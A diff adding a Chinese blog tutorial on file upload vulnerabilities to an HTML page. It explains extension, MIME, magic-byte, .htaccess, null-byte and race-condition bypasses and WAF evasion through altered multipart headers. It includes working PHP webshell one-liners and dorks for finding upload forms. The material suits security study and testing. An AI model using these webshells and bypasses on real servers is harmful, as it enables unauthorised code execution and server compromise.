@@ -5,12 +5,12 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title> - Hexo</title>
+    <title>文件上传漏洞 - Hexo</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    
+    <meta name="description" content="原理1网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell到一个Web可访问的目录上,"> 
     <meta name="author" content="John Doe"> 
     <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
     <link rel="icon" href="/img/85E0B2FE93C1D59651632D67AC59568B.png"> 
@@ -30,7 +30,7 @@
     <div class="bar" style="width: 0;"></div>
     <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
     <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle"></h3>
+    <h3 class="subtitle">文件上传漏洞</h3>
     <div class="social">
         <div>
             <div class="share">
@@ -45,14 +45,245 @@
     <div class="section">
         <div class="article">
     <div class='main'>
-        <h1 class="title"></h1>
+        <h1 class="title">文件上传漏洞</h1>
         <div class="stuff">
             <span>一月 24, 2022</span>
             
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">文件上传漏洞</a></li></ul>
+
 
         </div>
         <div class="content markdown">
-            
+            <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护。</span><br></pre></td></tr></table></figure>
+
+<h1 id="文件上传漏洞条件"><a href="#文件上传漏洞条件" class="headerlink" title="文件上传漏洞条件"></a>文件上传漏洞条件</h1><ul>
+<li>上传的文件能被Web服务器当做脚本来执行</li>
+<li>我们能够访问到上传文件的路径</li>
+</ul>
+<p>服务器上传文件命名规则</p>
+<ul>
+<li>第一种：上传文件名和服务器命名一致</li>
+<li>第二种：上传文件名和服务器命名不一致（随机、时间日期命名等），但是后缀一致</li>
+<li>第三种：上传文件名和服务器命名不一致（随机、时间日期命名等），后缀也不一致</li>
+</ul>
+<h1 id="常见文件上传类型"><a href="#常见文件上传类型" class="headerlink" title="常见文件上传类型"></a>常见文件上传类型</h1><p>常规类：扫描获取上传，会员中心上传，后台系统上传，各种途径上传</p>
+<p>CMS类：已知CMS源码，搜索已知cms漏洞（wordpress等）</p>
+<p>编辑器类：ckeditor,fckeditor,kindeditor,xxxeditor，也是搜索相关编辑器漏洞</p>
+<p>中间件类：可以通过中间件解析漏洞，上传包含后门代码的图片</p>
+<h1 id="文件上传注入点"><a href="#文件上传注入点" class="headerlink" title="文件上传注入点"></a>文件上传注入点</h1><p>\1. 常规文件上传地址的获取说明</p>
+<p>使用谷歌语法搜索inurl:upload.php</p>
+<p>\2. 寻找特定网站的文件上传：</p>
+<p>site:xx.xx upload</p>
+<p>\3. 通过后台目录扫描工具扫描</p>
+<h1 id="上传漏洞绕过"><a href="#上传漏洞绕过" class="headerlink" title="上传漏洞绕过"></a>上传漏洞绕过</h1><h2 id="1-客服端绕过"><a href="#1-客服端绕过" class="headerlink" title="1.客服端绕过"></a>1.客服端绕过</h2><p>（1）客户端校验:</p>
+<p>一般都是在网页上写一段 javascript 脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
+<p>（2）绕过方法:</p>
+<p>1.通过火狐插件 NOscript 插件或者禁用 IE 中 JS 脚本；</p>
+<p>2.通过 firbug 插件元素审核修改代码（如删除 onsubmit=”return checkFile()” 事件）；</p>
+<p>3.通过 firbug 元素审核 javascirpt 脚本中添加上传文件类型；</p>
+<p>4.通过利用 burp 抓包改包，先上传一个 gif 类型的木马，然后通过 burp 将其改为asp/php/jsp 后缀名即可 注意：这里修改文件名字后，请求头中的 Content-Length 的值也要改。</p>
+<h2 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2.服务端绕过"></a>2.服务端绕过</h2><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>黑名单扩展名绕过</p>
+<p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。绕过方法：</p>
+<h3 id="（1）找黑名单扩展名的漏网之鱼"><a href="#（1）找黑名单扩展名的漏网之鱼" class="headerlink" title="（1）找黑名单扩展名的漏网之鱼"></a>（1）找黑名单扩展名的漏网之鱼</h3><ul>
+<li>比如 iis6.0 中的 asa 和 cer </li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（php、php2、php3、php5、phtml、asp、aspx、ascx、</span><br><span class="line"></span><br><span class="line">ashx、cer、asa、jsp、jspx）cdx，</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）大小写"><a href="#（2）大小写" class="headerlink" title="（2）大小写"></a>（2）大小写</h3><p>可能存在大小写绕过漏洞 - 比如 aSp(iis6.0 中可以）和                       pHp（只能在 小于 php5.3.39 中的 linux 中）之中 </p>
+<h3 id="（3）能被web容器解析的文件其他扩展名列表："><a href="#（3）能被web容器解析的文件其他扩展名列表：" class="headerlink" title="（3）能被web容器解析的文件其他扩展名列表："></a>（3）能被web容器解析的文件其他扩展名列表：</h3><p>jsp, jspx ,jspf</p>
+<p>asp asa cer cdx,htr,xml,html</p>
+<p>aspx,ashx,asmx,asax,ascx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);//黑名单数组</span><br><span class="line">$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);//去掉文件名两侧的空白字符</span><br><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">$file_ext = strrchr($file_name, &#x27;.&#x27;);//截取最后.之后的内容</span><br><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">$file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure>
+
+<h3 id="（4）黑名单特殊后缀名绕过（利用难度高）"><a href="#（4）黑名单特殊后缀名绕过（利用难度高）" class="headerlink" title="（4）黑名单特殊后缀名绕过（利用难度高）"></a>（4）黑名单特殊后缀名绕过（利用难度高）</h3><p>将Burpsuite截获的数据包中backlion.php名字改为 baclion.php4(php1,php2,php3,php4,php5), 前提条件是 http.conf 中设置 AddType application/x-httpd-php .php1(php 的版本小于等于 5.3.29 以下)</p>
+<h3 id="（5）单双重后缀名绕过"><a href="#（5）单双重后缀名绕过" class="headerlink" title="（5）单双重后缀名绕过"></a>（5）单双重后缀名绕过</h3><p>（针对黑名单规则只过滤一次，双写脚本后缀）</p>
+<p>上传时将 Burpsuite 截的数据包中文件名 backlion.php（backlion.asa)改 为 backlion.pphphph(backlion.asasaa)，那么过滤了第一个”php”字符串”后， 开头的’p’和结尾的’hp’就组合又形成了 php</p>
+<h3 id="（6-点绕过。"><a href="#（6-点绕过。" class="headerlink" title="（6)点绕过。"></a>（6)点绕过。</h3><p>$file_name = deldot($file_name);//删除文件名末尾的点</p>
+<p>可以更改上传文件的后缀名a.php改为a.php. .</p>
+<p>经过代码过滤之后文件后缀名变为a.php. 。从而绕过黑名单提交到服务器，Windows服务器不允许后缀名最后带.,因此将文件后缀名还原为a.php</p>
+<h3 id="7-空格绕过"><a href="#7-空格绕过" class="headerlink" title="(7)空格绕过"></a>(7)空格绕过</h3><p>“a.php “不会匹配黑名单的.php从而绕过。且上传后会被Windows服务器自动去掉空格。</p>
+<h3 id="8-中间件解析漏洞。"><a href="#8-中间件解析漏洞。" class="headerlink" title="(8)中间件解析漏洞。"></a>(8)中间件解析漏洞。</h3><h3 id="（9）-htaccess文件攻击"><a href="#（9）-htaccess文件攻击" class="headerlink" title="（9）.htaccess文件攻击"></a>（9）.htaccess文件攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件攻击</span><br><span class="line"></span><br><span class="line">如果Web服务器是Apache且黑名单没有对.htaccess做限制，那么可以上传.htaccess配置文件到目录中覆盖Apache的设置，可以通过配置执行webshell。</span><br><span class="line"></span><br><span class="line">.htaccess文件攻击即结合黑名单攻击服务器的 .htaccess文件 。</span><br><span class="line"></span><br><span class="line">通过move_uploaded_file函数把自己写的 .htaccess文件覆盖掉服务</span><br><span class="line"></span><br><span class="line">器上的，这样就可以解析定义名单了。</span><br><span class="line"></span><br><span class="line">.htaccess文件用处：</span><br><span class="line"></span><br><span class="line">通过.htaccess文件调用php解释器去解析一个文件名中只要包含</span><br><span class="line"></span><br><span class="line">“haha”这个字符串的任意文件，无论你文件名是什么样子，只要包</span><br><span class="line"></span><br><span class="line">含”haha”这个字符串，都可以被以php的方式来解析。</span><br><span class="line"></span><br><span class="line">.htaccess文件内容：</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch “haha”&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（10）a.php::$DATA，<strong>Windows系统</strong>下PHP服务器会将后缀名带::$DATA的文件当作文件流处理，过滤不起作用，上传到服务器之后，截取::之前的格式作为文件后缀，也就是a.php</p>
+<p>总的来说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); //截取后缀名</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>
+
+<h3 id="（1）配合web容器的解析漏洞："><a href="#（1）配合web容器的解析漏洞：" class="headerlink" title="（1）配合web容器的解析漏洞："></a>（1）配合web容器的解析漏洞：</h3><p>IIS中的目录解析漏洞和分号解析漏洞 ：</p>
+<p>将一句话木马的文件名 backlion.php，改成 backlion.php.abc(奇怪的不被解析的后缀名都 行)。首先， 服务器验证文件扩展名的时候，验证的是.abc，只要该扩展名符合服务器端黑白名单觃则，即可上传。</p>
+<p>nginx 空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行。</p>
+<p>apache 的解析漏洞，上传如 a.php.rar a.php.gif 类型的文件名，可以避免 对于php文件的过滤机制，但是由于 apache 在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar 等扩展名是 apache 不能识别的， 因此就会直接将类型识别为 php，从而达到了注入php代码的目的。</p>
+<h3 id="（2）-00和0x00截断。0x0a截断"><a href="#（2）-00和0x00截断。0x0a截断" class="headerlink" title="（2）%00和0x00截断。0x0a截断"></a><strong>（2）%00和0x00截断。</strong>0x0a截断</h3><p>通过抓包截断将 backlion.asp.jpg 后面的一个.换成%00 在上传的时候即 backlion.asp%00.jpg，当文件系统读到%00 时，会认为文件已经结束，从而将 backlion.asp.jpg 的内容写入到 backlion.asp 中，从而达到攻击的目的。%00 不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截 断上传漏洞，上传格式如下：bk.asp%00.jpg</p>
+<p>%00是被服务器解码为0x00发挥了截断作用</p>
+<p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</p>
+<p>%00和0x00是有区别的：%00是URL中的，0x00是文件命名</p>
+<p>%00需要PHP版本小于5.3.4，且打开php的配置文件php-ini，将magic_quotes_gpc（魔术引号）设置为Off</p>
+<p>get会自动解码 %00</p>
+<p>post不会解码 %00 -&gt; url编码</p>
+<h3 id="（3）文件头内容检测绕过"><a href="#（3）文件头内容检测绕过" class="headerlink" title="（3）文件头内容检测绕过"></a><strong>（3）文件头内容检测绕过</strong></h3><p>文件头简介</p>
+<p>不同的图片文件都有不同文件头，如： PNG：文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识) GIF：文件头标识 (6 bytes) 47 49 46 38 39(37) 61 上传文件的时候会检查上传文件是否合法，如图片文件是否文件头含有 gif89, 这里可以通过一句话图片木马生成工具 edjpgcom 戒者通过编辑器在木马内容基础上再加了一些文件信息，有点像下面的结构:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个检测是利用getimagesize()函数来检测上传内容是否为图像以及图像大小。</p>
+<p>文件头就是文件特定的标志，如二进制PE文件的4D5A，bmp文件的424D，zip文件的504B0304，各种常见文件的文件头类型大家可以查找了解一下，常见图片文件头如下：</p>
+<p>gif： GIF89a</p>
+<p>jpg,jpeg: FF D8 FF</p>
+<p>png: 89 50 4E 47 0D 0A</p>
+<p>绕过思路：上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过。</p>
+<h3 id="（4）服务端-MIME-文件类型-Content-Type-绕过"><a href="#（4）服务端-MIME-文件类型-Content-Type-绕过" class="headerlink" title="（4）服务端 MIME 文件类型(Content-Type)绕过"></a>（4）服务端 MIME 文件类型(Content-Type)绕过</h3><p>MIME 的作用：</p>
+<p>使客户端软件，区分不同种类的数据，例如web浏览器就是通过 MIME 类 型来判断文件是GIF图片，还是可打印的 PostScript 文件。web服务器使用 MIME 来说明发送数据的种类，web客户端使用 MIME 来说明希望接收到的数据种类，它是服务器用来判断浏览器传递文件格式的重要标记项。</p>
+<p>常用的文件上传类型的 MIME 表： text/plain（纯文本） text/html（HTML 文档） text/javascript（js 代码） application/xhtml+xml（XHTML 文档） image/gif（GIF 图像） image/jpeg（JPEG 图像） image/png（PNG 图像） video/mpeg（MPEG 劢画） application/octet-stream（二迚制数据） application/pdf（PDF 文档） application/(编程语言) 该种语言的代码 application/msword（Microsoft Word 文件） message/rfc822（RFC 822 形式） multipart/alternative（HTML 邮件的 HTML 形式和纯文本形式，相同内容使 用不同形式表示） application/x-www-form-urlencoded（POST 方法提交的表单）multipart/form-data（POST 提交时伴随文件上传的表单）</p>
+<p>绕过方法：上传对文件类型做了限制，可通过 burpsuit 将其他类文件类型 修改为如：Content-Type：image/gif 和 image/jpeg 等运行的文件类型。</p>
+<h1 id="getimagesize-图像信息判断"><a href="#getimagesize-图像信息判断" class="headerlink" title="getimagesize()图像信息判断"></a>getimagesize()图像信息判断</h1><p>如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。</p>
+<p>通过Linux合成图片马,此时使用getimagesize()既可以获取图片信息，文件后缀php也能被解析为脚本文件，从而绕过getimagesize()的限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat image.jpg webshell.php &gt; image.php</span><br></pre></td></tr></table></figure>
+
+<h1 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h1><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含Webshell脚本，如果包含则删除文件。这里存在一个问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行文件上传和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
+<p>  利用：可以先上传一个webshell脚本10.php,10.php的内容是生成一个新的webshell脚本shell.php。10.php的代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">fputs(fopen(&#x27;../shell.php&#x27;,&#x27;w&#x27;),&#x27;一句话木马&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 当10.php上传成功后，客户端检查脚本文件后会自动生成shell.php。</p>
+<h1 id="突破exif-imagetype"><a href="#突破exif-imagetype" class="headerlink" title="突破exif_imagetype()"></a>突破exif_imagetype()</h1><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值跟getimagesize() 返回的数组中的索引 2 的值是一样的，但exif_imagetype函数快得多。PHP需要开启php_exif模块</p>
+<p><strong>绕过方法：</strong></p>
+<p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：</p>
+<p>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"> </span><br><span class="line">&lt;?</span><br><span class="line"> </span><br><span class="line">php echo shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>图片文件通常有称作幻数的头字节，我们来看一下几种图片文件的幻数：</p>
+<p>（注意！下面是二进制而不是文本格式的数据）</p>
+<p>JPG</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E0 00 10 4A 46 49 46</span><br></pre></td></tr></table></figure>
+
+<p>GIF(相当于文本的GIF89a)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47 49 46 38 39 61</span><br></pre></td></tr></table></figure>
+
+<p>PNG</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="带-waf-的文件上传绕过"><a href="#带-waf-的文件上传绕过" class="headerlink" title="带 waf 的文件上传绕过"></a>带 waf 的文件上传绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常见的绕过方法：</span><br><span class="line"></span><br><span class="line">1、数据溢出-防匹配（xxx...)</span><br><span class="line">2、符号变异-防匹配（&#x27; &quot; ;)</span><br><span class="line">3、数据截断-防匹配（%00 ； 换行）</span><br><span class="line">4、重复数据-防匹配（参数多次）</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-上传文件-WAF-检查的位置"><a href="#1-上传文件-WAF-检查的位置" class="headerlink" title="1.上传文件 WAF 检查的位置"></a>1.上传文件 WAF 检查的位置</h2><p>文件名：解析文件名，判断是否在黑名单内。文件内容：解析文件内容，判断是否为 webshell 文件目录权限 请求的 url Boundary 边界 MIME 文件类型 目前，市面上常见的是解析文件名，少数 WAF 是解析文件内容，比如长亭。</p>
+<h2 id="2-文件上传存在的上传特征"><a href="#2-文件上传存在的上传特征" class="headerlink" title="2.文件上传存在的上传特征"></a>2.文件上传存在的上传特征</h2><p>http 请求 Header 头部中的 Content-Type 存在以下特征：</p>
+<p>multipart/form-data:表示该请求是一个文件上传请求 存在 boundary 字符串:作用为分隔符，以区分 POST 数据 POST 的内容存在以下特征： Content-Disposition name filename POST 中的 boundary 的值就是 Content-Type 的值在最前面加了两个–，除了 最后 标识结束的 boundary 最后标识结束的 boundary 最后默认会多出两个–（测试时，最后一行的 boundary 删掉也能成功上传）。</p>
+<h2 id="3-绕过-WAF-文件上传的方法"><a href="#3-绕过-WAF-文件上传的方法" class="headerlink" title="3.绕过 WAF 文件上传的方法"></a>3.绕过 WAF 文件上传的方法</h2><h2 id="（1）填充垃圾数据绕过"><a href="#（1）填充垃圾数据绕过" class="headerlink" title="（1）填充垃圾数据绕过"></a>（1）填充垃圾数据绕过</h2><p>有些主机 WAF 软件为了不影响web服务器的性能，会对校验的用户数据设置 大小上限，比如 1M。此种情况可以构造一个大文件，前面 1M 的内容为垃圾内 容，后面才是真正的木马内容，便可以绕过 WAF 对文件内容的校验；’ Content-Type 类型数据后添加垃圾数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">a=11111111111111111111111111111111111111111111111111111111</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">&lt;?php  ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryYijPw9QB0WlswSL2</span><br><span class="line"></span><br><span class="line">a=111111111111111111111111111111111111111111111111111111111111111111111               </span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;bk.jpg&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+
+<h2 id="（2）文件扩展名出回车绕过（只支持-php）"><a href="#（2）文件扩展名出回车绕过（只支持-php）" class="headerlink" title="（2）文件扩展名出回车绕过（只支持 php）"></a>（2）文件扩展名出回车绕过（只支持 php）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.ph</span><br><span class="line"></span><br><span class="line">p&quot; Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; file</span><br><span class="line"></span><br><span class="line">name=&quot;bk.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+
+<p>又或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; fi</span><br><span class="line"></span><br><span class="line">lename=&quot;bk.php&quot; Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+
+<h2 id="（3）重复数据-防匹配（参数多次）"><a href="#（3）重复数据-防匹配（参数多次）" class="headerlink" title="（3）重复数据-防匹配（参数多次）"></a>（3）重复数据-防匹配（参数多次）</h2><ul>
+<li>重复filename </li>
+</ul>
+<p>添加一个 finame 参数：</p>
+<p>针对早期版本安全狗，可以多加一个 filename 在一个 Content-Disposition 中，存在多个 filename ，协议解析应该使用最 后的filename 值作为文件名。如果 WAF 解析到 filename=”bk.jpg”认为解析 到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是 bk.asp。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;;</span><br><span class="line"></span><br><span class="line">filename=&quot;bk.jpg&quot;;filename=&quot;bk.asp&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;Content-Disposition: form-data; name=&quot;upload_file&quot;;x.php&quot;</span><br><span class="line">filename=&quot;xx.jpg&quot;;filename=&quot;xx.jpg&quot;;filename=&quot;xx.jpg&quot;;filename=&quot;xx.jpg&quot;;...........filename=&quot;xx.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>●filename中配合其他参数</p>
+<p>配合Content-Disposition</p>
+<p><img src="D:\github.io\source_posts\文件上传漏洞\upload.md" alt="img"></p>
+<p> 配合Content-Type</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="D:\github.io\source_posts\文件上传漏洞\watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA56qN5LiN6YCa55qE5Yez5a2Q,size_14,color_FFFFFF,t_70,g_se,x_16" alt="img"></h2><h2 id="（4-修改-Content-Disposition-字段值的大小写绕过"><a href="#（4-修改-Content-Disposition-字段值的大小写绕过" class="headerlink" title="（4)修改 Content-Disposition 字段值的大小写绕过"></a>（4)修改 Content-Disposition 字段值的大小写绕过</h2><p>对这三个固定的字换:Content-Disposition,name,filename 比如 name 转换成 Name，Content-Disposition 转换成 content-disposition。 两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
+<p>Content-Disposition: form-data; name=”upfile”; filename=”bk.php”</p>
+<p>改成</p>
+<p>Content-Disposition: form-data; nAme=”upfile”; filename=”bk.php”</p>
+<h2 id="（5）文件重命名绕过"><a href="#（5）文件重命名绕过" class="headerlink" title="（5）文件重命名绕过"></a>（5）文件重命名绕过</h2><p>如果 web 程序会将 filename 除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。         Content-Disposition: form-data; name=”  file1”;</p>
+<p>filename=”bk……………………………………………………………………………………………………..</p>
+<p>………………………………………………………………………………………………asp”大概几百个点。</p>
+<h2 id="（6）删除-Content-Disposition-值的-form-data-绕过"><a href="#（6）删除-Content-Disposition-值的-form-data-绕过" class="headerlink" title="（6）删除 Content-Disposition 值的 form-data 绕过"></a>（6）删除 Content-Disposition 值的 form-data 绕过</h2><p>有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
+<p>Content-Disposition: form-data; name=”file1”; filename= “bk.php”</p>
+<p>改为：</p>
+<p>Content-Disposition: name=”file1”; filename= “bk.php”</p>
+<h2 id="7-符号变异"><a href="#7-符号变异" class="headerlink" title="(7)符号变异"></a>(7)符号变异</h2><p>符号变异就是猜测WAF检测的依据，例如filename=”a.php”</p>
+<p>网站安全狗WAF软件现在的机制就是匹配单/双引号里面的内容</p>
+<p>payload</p>
